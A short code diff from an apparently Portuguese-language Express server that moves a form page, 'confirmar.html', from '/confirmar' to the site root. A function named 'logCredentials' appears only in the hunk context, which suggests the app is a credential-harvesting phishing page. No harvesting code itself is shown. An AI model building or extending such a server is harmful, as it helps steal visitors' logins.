@@ -35,7 +35,7 @@ const logCredentials = (data) => {
 };
 
 // Rota para exibir a página do formulário
-app.get('/confirmar', (req, res) => {
+app.get('/', (req, res) => { //alterado aqui, era /confirmar
     res.sendFile(path.join(__dirname, 'confirmar.html'));
 });
 
